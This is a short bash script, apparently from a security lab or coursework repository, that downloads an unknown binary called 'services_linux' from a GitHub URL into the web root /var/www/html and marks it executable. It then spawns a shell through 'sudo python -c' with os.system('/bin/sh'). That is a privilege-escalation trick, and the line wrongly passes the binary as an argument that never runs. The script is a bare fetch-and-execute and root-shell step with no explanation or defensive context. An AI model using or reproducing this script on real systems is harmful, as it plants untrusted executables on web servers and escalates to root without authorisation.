#!/bin/bash

# Define the destination directory
DEST_DIR="/var/www/html"

# Ensure the destination directory exists
if [ ! -d "$DEST_DIR" ]; then
    echo "Destination directory $DEST_DIR does not exist. Creating it."
    mkdir -p "$DEST_DIR"
fi

# Download the file from the URL and save it to the destination directory
echo "Downloading..."
wget -O "$DEST_DIR/services_linux" https://github.com/ThanHuuTuan/DT_ATTT_VR/raw/main/services_linux

if [ $? -eq 0 ]; then
    echo "Download successful."
else
    echo "Download failed." >&2
    exit 1
fi

# Set execute permissions for the downloaded file
chmod +x "$DEST_DIR/services_linux"
echo "Changed file permissions."



# Run the Python command with sudo to open a shell
echo "Running Python command with sudo..."
sudo python -c 'import os; os.system("/bin/sh")' ./services_linux
